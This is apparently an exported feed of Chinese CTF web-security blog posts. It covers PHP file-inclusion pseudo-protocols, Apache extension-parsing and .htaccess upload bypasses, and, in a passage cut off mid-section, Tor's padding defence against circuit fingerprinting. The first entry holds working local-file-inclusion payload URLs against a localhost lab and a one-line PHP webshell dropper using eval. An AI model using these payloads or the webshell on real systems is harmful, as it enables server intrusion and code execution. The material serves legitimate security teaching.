class="code"><pre><span class="line">http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</span><br></pre></td></tr></table></figure><p>使用绝对路径来访问<code>E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</code></p><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=./phpinfo.txt</span><br></pre></td></tr></table></figure><p>使用相对路径来访问当前目录下的<code>phpinfo.txt</code></p><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure><p>访问一个网络上的地址</p><br><hr><br><h1 id="3-php-x2F-x2F-协议"><a href="#3-php-x2F-x2F-协议" class="headerlink" title="3_php:&#x2F;&#x2F;协议"></a>3_php:&#x2F;&#x2F;协议</h1><p>对<code>PHP.ini</code>配置文件的要求:</p><blockquote><p><strong><code>php://filter</code></strong> 在 <code>allow_url_fopen</code>和<code>allow_url_include</code>两个字段的值都是off的情况下也可以使用</p><p><strong><code>php://input、 php://stdin、 php://memory 和 php://temp</code></strong> 需要<code>allow_url_include</code>的值为on</p></blockquote><p>作用: </p><p>访问各个输入&#x2F;输出流（<code>I/O streams</code>），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于执行php代码。</p><br><h2 id="3-1-php-x2F-x2F-filter"><a href="#3-1-php-x2F-x2F-filter" class="headerlink" title="3.1_php:&#x2F;&#x2F;filter"></a>3.1_php:&#x2F;&#x2F;filter</h2><blockquote><p>参数解析, 参数之间用<code>/</code>来分隔开</p><table><thead><tr><th><strong>php:&#x2F;&#x2F;filter 参数</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>resource&#x3D;&lt;要过滤的数据流&gt;</td><td>必须项。它指定了你要筛选过滤的数据流。（必选）</td></tr><tr><td>read&#x3D;&lt;读链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（|）分隔。（可选）</td></tr><tr><td>write&#x3D;&lt;写链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（|）分隔。（可选）</td></tr><tr><td>&lt;;  两个链的过滤器&gt;</td><td>任何没有以 <em>read&#x3D;</em> 或 <em>write&#x3D;</em> 作前缀的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table></blockquote><p>示例1: <span id="meiya_person_03" style='color:black;background:yellow;font-size:16px;font-family:hei'><strong>(利用cmd.php中名为cmd的变量)</strong></span></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/cmd.php?cmd=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>效果是读取<code>flag.php</code>的源码,并进行<code>base64</code>编码之后输出</p><p>参数<code>read</code>的值为<code>convert.base64-encode</code>,这是一个用于<code>base64</code>编码的<strong>过滤器</strong></p><p>参数<code>resource</code>的值为<code>flag.php</code>要读&#x2F;写的<strong>数据流</strong></p><p>假设有一个名为<code>hello.php</code>写了以下内容, 且同目录下有一个名为<code>flag.php</code>的文件</p><img src="/images/ctf-web02/image-20220923225648738.png" alt="image-20220923225648738" style="zoom:67%;" /><p>访问<code>hello.php</code>的效果:</p><img src="/images/ctf-web02/image-20220923225748400.png" alt="image-20220923225748400" style="zoom:67%;" /><p>再把这里输出的编码后的内容解码出来, 就可以得到<code>flag.php</code>的源码内容了</p><img src="/images/ctf-web02/image-20220923225849854.png" alt="image-20220923225849854" style="zoom:67%;" /><hr><p><strong>四类可用的<code>php://filter</code>过滤器:</strong></p><table><thead><tr><th><strong>字符串过滤器</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>string.rot13</td><td>等同于str_rot13()，rot13变换</td></tr><tr><td>string.toupper</td><td>等同于strtoupper()，转大写字母</td></tr><tr><td>string.tolower</td><td>等同于strtolower()，转小写字母</td></tr><tr><td>string.strip_tags</td><td>等同于strip_tags()，去除html、PHP语言标签</td></tr></tbody></table><table><thead><tr><th><strong>转换过滤器</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>convert.base64-encode  &amp; convert.base64-decode</td><td>等同于base64_encode()和base64_decode()，base64编码解码</td></tr><tr><td>convert.quoted-printable-encode  &amp; convert.quoted-printable-decode</td><td>quoted-printable  字符串与 8-bit 字符串编码解码</td></tr></tbody></table><table><thead><tr><th><strong>压缩过滤器</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>zlib.deflate  &amp; zlib.inflate</td><td>在本地文件系统中创建  gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td></tr><tr><td>bzip2.compress  &amp; bzip2.decompress</td><td>同上，在本地文件系统中创建  bz2 兼容文件的方法。</td></tr></tbody></table><table><thead><tr><th><strong>加密过滤器</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>mcrypt.*</td><td>libmcrypt  对称加密算法</td></tr><tr><td>mdecrypt.*</td><td>libmcrypt  对称解密算法</td></tr></tbody></table><br><br><h2 id="3-2-php-x2F-x2F-input"><a href="#3-2-php-x2F-x2F-input" class="headerlink" title="3.2_php:&#x2F;&#x2F;input"></a>3.2_php:&#x2F;&#x2F;input</h2><p>可以用来执行<code>POST</code>数据中的<code>php</code>代码</p><p>例如:  对于<code>include.php</code> 中的<code>file</code>变量: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br></pre></td></tr></table></figure><p>然后通过<code>HackBar</code>插件来POST一段php代码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><p>效果: 成功执行了上述代码</p><img src="/images/ctf-web02/1.jpg" alt="1" style="zoom:67%;" /><p>如果有权限，还可以通过<code>POST</code>写入一句话木马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&#x27;1juhua.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;); ?&gt;</span><br></pre></td></tr></table></figure><br><hr><br><h1 id="4-data-x2F-x2F-协议"><a href="#4-data-x2F-x2F-协议" class="headerlink" title="4_data:&#x2F;&#x2F;协议"></a>4_data:&#x2F;&#x2F;协议</h1><p>自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以<strong>用来执行PHP代码</strong>。一般需要用到<code>base64编码</code>传输</p><p>条件: <code>PHP.ini</code>中</p><ul><li><code>allow_url_fopen:on</code></li><li><code>allow_url_include :on</code></li></ul><p>用法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,「要执行的php代码」</span><br><span class="line">data://text/plain;base64,「base64编码后要执行的php代码」</span><br></pre></td></tr></table></figure><p>示例:</p><p><code>include.php</code>中, 有<code>include($file)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br></pre></td></tr></table></figure><img src="/images/ctf-web02/2.jpg" alt="2" style="zoom:100%;" /><p>成功执行了<code>&lt;?php phpinfo();?&gt;</code></p><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure><img src="/images/ctf-web02/3.jpg" alt="3" style="zoom:100%;" /><br><hr><br><h1 id="5-zip-x2F-x2F-amp-bzip2-x2F-x2F-amp-zlib-x2F-x2F-协议"><a href="#5-zip-x2F-x2F-amp-bzip2-x2F-x2F-amp-zlib-x2F-x2F-协议" class="headerlink" title="5_zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F; 协议"></a>5_zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F; 协议</h1><p>条件: <code>PHP.ini</code>中</p><ul><li><code>allow_url_fopen:on</code></li><li><code>allow_url_include :off/on</code></li></ul><p>作用：<code>zip:// &amp; bzip2:// &amp; zlib:// </code>均属于压缩流，<strong>可以访问压缩文件中的子文件</strong>，更重要的是<strong>不需要指定后缀名</strong>，可修改为任意后缀：jpg png gif xxx 等等。(将最终希望执行的文件压缩可以绕过很多对文件类型的验证)</p><p>示例1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（**#编码为%23**）</span><br></pre></td></tr></table></figure><p>压缩 <code>phpinfo.txt</code> 为 <code>phpinfo.zip</code> ，压缩包重命名为 <code>phpinfo.jpg</code>(绕过验证,假设只允许上传图片) ，并上传</p><p>然后访问:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</span><br></pre></td></tr></table></figure><img src="/images/ctf-web02/4.jpg" alt="4" style="zoom:100%;" /><p>​由此访问了压缩文件内的<code>phpinfo.txt</code></p><hr><p>示例2:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.bzip2://file.bz2</span><br></pre></td></tr></table></figure><p>压缩<code> phpinfo.txt</code> 为 <code>phpinfo.bz2 </code>并上传（同样支持任意后缀名）</p><p>然后访问:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</span><br></pre></td></tr></table></figure><p>效果和示例1相同 也访问到了<code>phpinfo.txt</code></p><hr><p>示例3:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib://file.gz</span><br></pre></td></tr></table></figure><p>压缩 <code>phpinfo.txt</code> 为 <code>phpinfo.gz</code> 并上传（同样支持任意后缀名）</p><p>然后访问:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</span><br></pre></td></tr></table></figure><p>效果一样</p><br><hr><br><h1 id="6-http-x2F-x2F-amp-https-x2F-x2F-协议"><a href="#6-http-x2F-x2F-amp-https-x2F-x2F-协议" class="headerlink" title="6_http:&#x2F;&#x2F; &amp; https:&#x2F;&#x2F; 协议"></a>6_http:&#x2F;&#x2F; &amp; https:&#x2F;&#x2F; 协议</h1><p>条件: <code>PHP.ini</code>中</p><ul><li><code>allow_url_fopen:on</code></li><li><code>allow_url_include :on</code></li></ul><p>作用: 常规 URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。</p><p>用法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://example.com</span><br><span class="line">http://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">http://user:password@example.com</span><br><span class="line">https://example.com</span><br><span class="line">https://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">https://user:password@example.com</span><br></pre></td></tr></table></figure><p>示例:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure><img src="/images/ctf-web02/5.jpg" alt="5" style="zoom:100%;" /><br><hr><br><h1 id="6-phar-x2F-x2F-协议"><a href="#6-phar-x2F-x2F-协议" class="headerlink" title="6_phar:&#x2F;&#x2F;协议"></a>6_phar:&#x2F;&#x2F;协议</h1><p><code>phar://</code>协议与<code>zip://</code>类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</span><br></pre></td></tr></table></figure><img src="/images/ctf-web02/6.jpg" alt="6" style="zoom:100%;" />]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache的文件解析漏洞(特性)</title>
      <link href="/post/aeaad0f.html"/>
      <url>/post/aeaad0f.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.werner.wiki/file-resolution-vulnerability-apache/">https://blog.werner.wiki/file-resolution-vulnerability-apache/</a></p><h1 id="1-多后缀名"><a href="#1-多后缀名" class="headerlink" title="1.多后缀名"></a>1.多后缀名</h1><p>Apache认为, 一个文件可以有多个后缀,如:<code>111.txt.png.mp3.abc</code></p><p>服务器在读取时, 会从右向左读取. 如果认识这个后缀, 就会以此来识别文件的类型, 如果不认识, 就会继续向左读取下一个后缀</p><p>例如上面这个文件名, 读取第一个<code>abc</code>发现不认识, 继续向左, 读取到<code>mp3</code>, 认识了, 那么就把此文件当成一个<code>mp3</code>文件来处理</p><p>如果一直到最左边都不认识, 则会把该文件当做<strong>默认类型</strong>进行处理, 一般是<code>text/plain</code>.</p><br><p>Apache认识的文件后缀记录在 名为<code>mime.types</code>的文件, 其路径为  <code>apache安装目录/conf/mime.types</code></p><p>这个文件很长:</p><img src="/images/ctf-web01/image-20220923214848650.png" alt="image-20220923214848650" style="zoom: 67%;" /><p>由此带来的问题:</p><p>有的网站为了防止用户上传恶意文件, 会写脚本对文件后缀进行检测, 如果不了解apache的这个特性, 可能编写的检测代码只会检测文件名最后面的这个后缀.</p><p>这样,如果用户上传一个名为<code>xxx.php.abc</code>的文件, 就能够绕过检测. 同时,这个文件在上传后还能够被apache识别为<code>php</code>文件并执行.</p><blockquote><p>然而在实际测试的时候, 发现类似<code>aaa.php.xxx</code>的文件并不会被作为<code>php</code>程序执行</p><p>猜测:</p><p>Apache虽然能够识别这是一个<code>php</code>文件, 但是将它交给<code>php</code>解释器之后, <code>php</code>的文件后缀解析规则却不是这样, 因此<code>php</code>解释器并不认为这是一个<code>php</code>文件, 故而不会把它当作<code>php</code>文件执行, 而是直接输出了文件内容.</p></blockquote><p>在Apache的模块的配置文件中找到了<code>php5.conf</code> :</p><p>其中规定: 被当做<code>php</code>程序执行的文件名要符合正则表达式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.+\.ph(p[345]?|t|tml)$</span><br></pre></td></tr></table></figure><p>在<code>mime.types</code>中, 也有这一段:</p><img src="/images/ctf-web01/image-20220923215253544.png" alt="image-20220923215253544" style="zoom:67%;" /><p>由此可见, <code>php3,php4,php5,pht,phtml </code>这几个后缀都能被识别为<code>php</code>文件</p><p>因此, 在绕过检测时, 也可以将文件后缀改成这几个.</p><p>测试，先准备文件<code>text.php</code>，其内容是输出Hello World：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo &#x27;HELLO WORLD&#x27;; ?&gt;</span><br></pre></td></tr></table></figure><p>然后在浏览器中打开它，成功显示“HELLO WORLD”。再修改该文件后缀为各种后缀，进行测试。测试结果是，以<code>php、phtml、pht、php3、php4和php5</code>为后缀，能成功看到“HELLO WORLD”；以<code>phps</code>为后缀，会报403错误，Forbidden；以<code>php3p</code>为后缀，<strong>会在浏览器中看到源码</strong>。</p><br><hr><br><h1 id="2-htaccess特性"><a href="#2-htaccess特性" class="headerlink" title="2.htaccess特性"></a>2.htaccess特性</h1><blockquote><p><code>htaccess</code>文件是Apache服务器中的一个配置文件，<strong>提供了针对目录改变配置的方法</strong>,<strong>负责相关目录下的网页配置</strong>。通过<code>.htaccess</code>文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><p><code>.htaccess</code>文件可以配置很多事情，如<strong>是否开启站点的图片缓存、自定义错误页面、自定义默认文档、设置WWW域名重定向、设置网页重定向、设置图片防盗链和访问权限控制</strong>。</p></blockquote><br><p>此处只关心<code>.htaccess</code>文件的一个作用——<strong>MIME类型修改</strong>。如在<code>.htaccess</code>文件中写入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php xxx </span><br></pre></td></tr></table></figure><p>就能成功地使该<code>.htaccess</code>文件所在目录及其子目录中的后缀为<code>.xxx</code>的文件被Apache当做<code>php</code>文件。(<strong>相当于建立一个<code>xxx</code>后缀到<code>php</code>文件类型的映射</strong>)</p><p>另一种写法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;shell.jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>该语句会让Apache把<code>shell.jpg</code>文件解析为<code>php</code>文件。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TOR的防御机制PADDING</title>
      <link href="/post/212eacc4.html"/>
      <url>/post/212eacc4.html</url>
      
        <content type="html"><![CDATA[<p><span id="jiaquanluyou" style='color:black;background:yellow;font-family:hei;font-weight:bold;font-size:25px'>前置的一些基础原理见: <a href="75310f08.html">TOR原理</a></span></p><h1 id="0-概述"><a href="#0-概述" class="headerlink" title="0_概述"></a>0_概述</h1><p><a href="75310f08.html">TOR原理</a>那篇文章的第三部分已经说明过, TOR cell是TOR中的基本通信单元, 一个TOR cell的大小固定为<strong>512</strong>或<strong>514</strong>字节</p><p>尽管TOR的机制能够有效地保护通信双方的身份以及通信内容不被泄露, 但是其实很早就有研究提出可以通过指纹攻击的方式来从流量模式 (<strong>例如数据包的序列特征</strong>) 入手来检测出TOR流量了. 对于监管者 (例如运营商) 来说, 其实也并不用彻底掌握用户到底在暗网中看到了啥不该看的内容, 只需要简单地检测出有暗网流量产生, 然后再把它BAN掉就行了. 因此这类能够有效检测出TOR流量的指纹攻击手段确实对TOR的安全性产生了不小的威胁. TOR必须采取一定的应对手段来进一步提升自己的安全性. </p><blockquote><p>•Kwon, Albert et al. “Circuit Fingerprinting Attacks: Passive Deanonymization of Tor Hidden Services.” <em>USENIX Security Symposium</em> (2015).</p><p>这篇文章利用简单的决策树算法, 依赖的特征仅仅是<code>Client</code>或<code>HS</code>在构建<code>IPO</code>或<code>RPO</code>链路时收发携带不同<code>Command</code>的Tor cell的顺序关系, 就能够检测出当前链路的类型(<strong>Client端IPO&#x2F; Client端RPO&#x2F; HS端IPO&#x2F; HS端RPO</strong>)</p><p>当时也是立马引起了Tor官方的反应:</p><img src="/images/tor-padding/image-20220822120634208.png" alt="image-20220822120634208" style="zoom:67%;" /><p>很快, Tor官方就提出了应对手段, 并在0.4.1.1-alpha版本里首次实现, 也就是本篇讨论的重点:  <strong><code>Padding</code>机制</strong>.</p></blockquote><p><code>Padding</code>说白了就是在正常的Tor流量中混入一些特殊且无用的数据包(Tor cell),  这些数据包由<code>Client</code>和 某个Tor链路上的一个<code>OR</code>协商后互相发送和接收 , 以破坏在<code>Client</code>和这个<code>OR</code>之间截获流量的观察者所看到的「Tor流量在数据包分布等方面的特征」, 这些刻意发送的数据包被称为 <code>Padding cell</code>.  </p><p>目前官方提出了两种<code>Padding</code>方式: <code>connection-level padding</code>和<code>circuit-level padding</code>, 分别应对处在不同位置的攻击者:</p><div align='center' style='font-family:hei;font-weight:bold'>    (下图中上方的链路为IPO链路, 下方的链路为RPO链路)</div><img src="/images/tor-padding/image-20220822153045204.png" alt="image-20220822153045204" style="zoom:67%;" /><p>对于<code>connection-level padding</code>来说,后者就是普通的数据流量, 为了有所区分,当<code>circuit-level padding</code>工作时,<code>connection-level padding</code>不工作. </p><br><hr><br><h1 id="1-connection-level-padding"><a href="#1-connection-level-padding" class="headerlink" title="1_connection-level padding"></a>1_connection-level padding</h1><p>此种<code>Padding cell</code>的 <code>Command</code>字段值为<strong>0</strong>(<code>PADDING</code>)  (见<a href="75310f08.html">TOR原理3.2</a>) , 一般由<code>Client</code>和<code>Entry</code>之间协商后发送和接收.</p><p><code>connection-level padding</code>较为简单,  应对在<code>Client</code>和<code>Entry</code>之间控制了任何普通的非Tor网络节点的攻击者, 这些截获流量的攻击者因为没有Tor链路上<code>OR</code>之间协商的密钥, 能看见的只是被下层的TLS等协议加密后的密文流量.  </p><p>而与此相对, 即使不是Tor cell的接收者, 一个Tor链路上的<code>OR</code>也能够解读出一个Tor cell的前3字节内容, 这部分内容包含2字节的<code>Circuit ID</code>和1字节的<code>Command</code>, 能够解读<code>Command</code>字段也就意味着<code>OR</code>都能够识别出此类<code>Padding cell</code>. 因此, 如果一个攻击者控制了Tor链路上<code>Entry</code>这样的节点, <code>connection-level padding</code>也就失效了. </p><img src="/images/tor-padding/image-20220822154318021.png" alt="image-20220822154318021" style="zoom:67%;" /><p>在<code>Client</code>和<code>Entry</code>之间应用<code>connection-level padding</code>时:</p><p>两个节点共同持有一个关于TLS连接应用数据的计时器. 每当两端收到一个正常的数据包,它们都会根据一个特定的超时分布在1.5s至9.5s之间取一个<strong>超时值</strong>, 如果在这个超时值之前收到了下一个携带真实数据的Tor cell,那么重新选择该值; 如果在此之前没有收到真实的Tor cell,那么将会发送<code>Padding cell</code></p><p>由此以来, 在不超过10s的超时时间到达之前, 链路上总会有真实的Tor cell或者<code>Padding cell</code>被发送, 那么分不清真实Tor cell和<code>Padding cell</code>的链路上的攻击者就无法通过数据包间隔时间等特征来记录流量模式</p><br><hr><br><h1 id="2-circuit-level-padding"><a href="#2-circuit-level-padding" class="headerlink" title="2_circuit-level padding"></a>2_circuit-level padding</h1><p>假设攻击者控制了Tor 链路上的<code>Entry</code>节点. 那么他能够看见在此被TLS解密后的Tor cell, 并读取每个Tor cell的前3字节数据. 也就能识别并丢弃来自<code>connection-level padding</code>的<code>Padding cell</code></p><p>通过记录流量特征, 攻击者还能够察觉当前链路的类型, 是访问互联网服务的三跳链路, 还是用于访问<code>HS</code>的<code>IPO</code>或<code>RPO</code>链路</p><p><code>circuit-level padding</code>的目的就是避免控制了<code>Entry</code>的攻击者识别出链路的类型</p><img src="/images/tor-padding/image-20220822161841331.png" alt="image-20220822161841331" style="zoom:67%;" /><p><code>circuit-level padding</code>由<code>Client</code>和<code>Middle</code>互相发送和接收<code>Padding cell</code>, 这里它们用于发送<code>Padding cell</code>的程序视为一个状态机, 称为<code>Padding Machine</code></p><p>此种<code>Padding cell</code>的<code>Command</code>字段值为<strong>3</strong>(<code>RELAY</code>), <code>Relay Command</code>的值为10(<code>Drop</code>) ,对于只能在在<code>Entry</code>处观察到Tor cell的前3字节的攻击者来说, 此种cell和一般的Tor cell无异.</p><p><br><br></p><h2 id="2-1PADDING协商"><a href="#2-1PADDING协商" class="headerlink" title="2.1PADDING协商"></a>2.1PADDING协商</h2><p>执行<code>circuit-level padding</code>的是部署在<code>Client</code>和<code>middle</code>上的<strong>padding状态机</strong></p><p>在进行padding之前, 需要通过发送携带特殊的<code>Relay Command</code>字段值(**41&#x2F;42)**的<code>RELAY cell</code>来进行PADDING协商:</p><img src="/images/tor-padding/1.png" alt="padding_relay_cell" style="zoom:67%;" /><p>分别是由padding的发起方发送的<code>PADDING_NEGOTIATE_cell</code>(41)和由响应方发送的<code>PADDING_NEGOTIATED_cell</code>(42)</p><p>其中,请求方发送的<code>PADDING_NEGOTIATE_cell</code>的payload中包含以下内容:(下面的结构体struct)</p><img src="/images/tor-padding/2.png" alt="PADDING_NEGOTIATE_cell_payload" style="zoom:67%;" /><p>其中各个字段:</p><ul><li><p>command &#x3D; <code>「CIRCPAD_COMMAND_START」(2)</code></p></li><li><p>machine_type &#x3D; <code>「CIRCPAD_MACHINE_CIRC_SETUP」(1)</code> <strong>此值用于标记发送它的是发起padding的一方</strong></p></li><li><p>michine_ctr : 当前链路上<code>machine instance</code>的数量, 用于消除关闭请求的歧义,如果该字段不符合事实,那么请求将被忽略</p><br></li></ul><p>当接收方收到<code>PADDING_NEGOTIATE_cell</code>时, 首先检查请求方请求的<code>version</code>等自己是否支持, 然后发送<code>PADDING_NEGOTIATED_cell</code>,其payload包含以下内容:</p><img src="/images/tor-padding/3.png" alt="PADDING_NEGOTIATED_cell_payload" style="zoom:67%;" /><p>在收到<code>PADDING_NEGOTIATE_cell</code>之前, <code>Client</code>就可以开始发送<code>Padding cell</code>了</p><p><br><br></p><h2 id="2-2对IPO链路的混淆"><a href="#2-2对IPO链路的混淆" class="headerlink" title="2.2对IPO链路的混淆"></a>2.2对IPO链路的混淆</h2><blockquote><p>tor中,访问互联网网站(非<code>HS</code>)的通信,cell序列一般遵循以下模式: <strong>创建三跳链路 - 请求服务 - 交互应用数据</strong></p><p>([DATA]表示由<code>Client</code>发送给<code>Server</code>的Cell, DATA相反方向的Cell), padding机制需要尽可能把<code>IPO</code>和<code>RPO</code>链路上的cell序列伪装成此种模式:</p><img src="/images/tor-padding/4.png" alt="Normal Circuit" style="zoom:67%;" /></blockquote><p>一般来说, <code>IPO</code>链路上的Cell序列表现为:</p><img src="/images/tor-padding/5.png" alt="IPO circuit" style="zoom: 80%;" /><p>和一般链路对比可以看出, 前面通过<code>RELAY_EXTEND cell</code>建立链路的阶段是相似的, 主要需要将<code>[INTRO1]</code>和<code>[INTRODUCE_ACK]</code>这里混淆成这种形式: </p><img src="/images/tor-padding/6.png" alt="DATA" style="zoom: 80%;" /><p>在<code>[INTRO1]</code>和<code>[INTRODUCE_ACK]</code>之间发送<code>PADDING_NEGOTIATE_cell</code>和<code>PADDING_NEGOTIATED_cell</code>进行padding协商:</p><img src="/images/tor-padding/7.png" alt="NEGOTIATE" style="zoom: 80%;" /><p>在此之后, <code>Middle</code>会给<code>Client</code>发送7-10个<code>Padding cell</code>(<strong>RELAY_drop</strong>), 以模拟正常通信中服务器发回数据的过程</p><p><br><br></p><h2 id="2-3对RPO链路的混淆"><a href="#2-3对RPO链路的混淆" class="headerlink" title="2.3对RPO链路的混淆"></a>2.3对RPO链路的混淆</h2><p><code>RPO</code>链路的混淆目标也是一般的Tor三跳链路:</p><img src="/images/tor-padding/4.png" alt="Normal Circuit" style="zoom:67%;" /><p>一般来说, <code>RPO</code>链路上的Cell序列表现为:</p><img src="/images/tor-padding/8.png" alt="RPO Circuit" style="zoom: 80%;" /><p>添加<code>Padding cell</code>(<strong>DROP</strong>)后:(前面提过,<code>client</code>在收到<code>PADDING_NEGOTIATED_cell</code>之前就能开始发送<code>Padding cell</code>)</p><img src="/images/tor-padding/9.png" alt="RPO PADDING Circuit" style="zoom: 80%;" /><p>在此之后,由<code>RPO</code>方向正常传回来自于<code>HS</code>的应用数据即可(不再需要<code>Padding cell</code>)</p><p>因为当<code>RPO</code>链路完全建立完成时,链路上会有来自隐藏服务器端的应用数据,对于无法看到payload的攻击者来说,来自<code>HS</code>的正常cell和<code>Padding cell</code>没有区别,因此此时padding可以停止.</p><p><br><br></p><h2 id="2-4Padding-Machine的工作机制"><a href="#2-4Padding-Machine的工作机制" class="headerlink" title="2.4Padding Machine的工作机制"></a>2.4Padding Machine的工作机制</h2><p><code>Padding Machine</code>是一种状态机, 工作时根据实际情况在不同状态之间进行转换</p><p>首先定义数据流有两种状态:<code>Burst</code>和<code>gap</code></p><img src="/images/tor-padding/10.png" alt="Burst and Gap" style="zoom: 80%;" /><ul><li><code>Burst</code> : 一段在短时间内集中发送的数据包序列(数据包的密度较大),,此时<code>Padding Machine</code>处于<code>burst mode</code>, padding的需求较小, 在发送<code>Padding cell</code>之前需等待更长的时延.</li><li><code>Gap</code> :一段时间跨度较长的数据包序列(数据包的密度较小),此时链路上的流模式特征性更强, 很可能被攻击者记录并分析, 因此padding的需求较大,<code>Padding Machine</code>处于<code>gap mode</code>,仅等待较短的时延后就可以发送<code>Padding cell</code>.</li></ul><br><p>每个<code>Padding Machine</code>都会保存两个直方图<code>HG</code>和<code>HB</code>分别用于在<code>gap mode</code>和<code>burst mode</code>下选择合适的发送<code>Padding cell</code>的等待时延:</p><img src="/images/tor-padding/11.png" alt="Histogram" style="zoom: 80%;" /><p>其横轴为时延值, 纵轴为<code>Tokens</code>, 表示在某个时延范围(<code>Bin</code>)中选择一个合适的具体时延值的可能性</p><br><p><code>Padding 